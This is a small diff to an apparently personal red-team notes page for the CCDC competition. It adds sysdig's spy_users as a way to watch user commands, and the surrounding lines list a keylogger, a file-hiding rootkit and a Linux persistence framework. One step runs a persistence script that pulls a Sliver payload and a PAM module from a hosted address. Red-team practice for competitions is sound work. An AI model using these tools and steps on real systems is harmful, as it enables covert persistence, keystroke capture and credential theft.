@@ -65,6 +65,7 @@ pagetitle: Red Teaming for CCDC
     - https://github.com/jarun/spy - grabs keyboard input and puts it in /sys/kernel/debug/kisni/keys
     - https://github.com/ait-aecid/caraxes/ - hides files, could we use this to hide an ssh key?
     - https://github.com/Aegrah/PANIX - Linux persistence framework (this seems REALLY REALLY good)
+    - https://github.com/draios/sysdig - `-c spy_users` can read every user command ran?
 - Run [linux_persistence.sh {ip}:{port} {sliver_payload_file} {pam_so_file}](https://khaelkugler.com/scripts/linux_persistence.sh.txt) while hosting the payload
   - Make sure to point the script to the correct location to pull both files from
     - Make sure to generate sliver payloads beforehand
